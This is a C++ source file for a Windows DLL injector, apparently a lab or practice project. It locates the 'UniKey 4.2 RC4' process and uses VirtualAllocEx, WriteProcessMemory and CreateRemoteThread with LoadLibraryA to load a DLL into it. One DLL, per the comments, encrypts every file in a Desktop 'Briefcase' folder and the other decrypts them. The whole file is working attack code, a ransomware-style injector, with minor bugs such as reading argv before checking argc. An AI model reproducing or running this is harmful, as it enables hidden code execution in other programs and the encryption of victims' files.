#include <iostream>
#include <windows.h>
#include <string>
#include <thread>
#include <libloaderapi.h>
#include <tchar.h>

using namespace std;

// Grab target's id
void getProcID(const char* title, DWORD& id) {
    GetWindowThreadProcessId(FindWindow(NULL, title), &id);
}
// Display errors
void errorDisplay(const char* title, const char* message) {
    MessageBox(0, message, title, 0);
    exit(-1);
}
// Check if file exists
bool fileExists(string filename) {
    struct stat buffer;
    return stat(filename.c_str(), &buffer) == 0;
}
int main(int argc, char** argv)
{
    int option = atoi(argv[1]);                 //encrypt or decrypt
    DWORD  procID = NULL;
    char dllPath[MAX_PATH];
    const char* title = "UniKey 4.2 RC4";
    const char* dllName = NULL;
    if (argc == 1 || (argc ==2  && option == 1))       //encrypt all files in ~/Desktop/Briefcase
    {
        dllName = "EncryptFile.dll";
    }
    else if (argc == 2 && option == 2) {
        dllName = "DecryptFile.dll";
    }
    else {
        std::cout << "Usage: ./DLLInjector or Usage: ./DLLInjector 1 to encrypt" << endl;
        std::cout << "Usage: ./DLLInjector 2 to decrypt" << endl;
        return -1;
    }
    

    if (!fileExists(dllName)) {
        errorDisplay("fileExists", "File DLL does not exist");
        return -1;
    }

    if (!GetFullPathName(dllName, MAX_PATH, dllPath, NULL)) {
        errorDisplay("GetFullPathName", "Failed to get DLL full path");
        return -1;
    }

    getProcID(title, procID);
    if (procID == NULL) {
        errorDisplay("getProcID", "Failed to get process ID");
        return -1;
    }

    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, NULL, procID);
    if (!hProcess) {
        errorDisplay("OpenProcess", "Failed to open a handle to process");
        return -1;
    }

    void* alloMem4DLLPath = VirtualAllocEx(hProcess, NULL, MAX_PATH, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
    if (!alloMem4DLLPath) {
        errorDisplay("VirtualAllocEx", "Failed to allocate memory");
        return -1;

    }

    if (!WriteProcessMemory(hProcess, alloMem4DLLPath, dllPath, MAX_PATH, NULL)) {
        errorDisplay("WriteProcessMemory", "Failed to write to allocated mem");
        return -1;

    }

    HANDLE hThread = CreateRemoteThread(hProcess, NULL, NULL,
        LPTHREAD_START_ROUTINE(LoadLibraryA),
        alloMem4DLLPath, NULL, NULL);
    if (!hThread) {
        errorDisplay("CreateRemoteThread", "Failed to create remote thread");
        return -1;

    }
    CloseHandle(hThread);

    CloseHandle(hProcess);

    VirtualFreeEx(hProcess, alloMem4DLLPath, NULL, MEM_RELEASE);

    MessageBox(0, "You sucessfully injected DLL to the process!", "Success", 0);
    return 1;

}

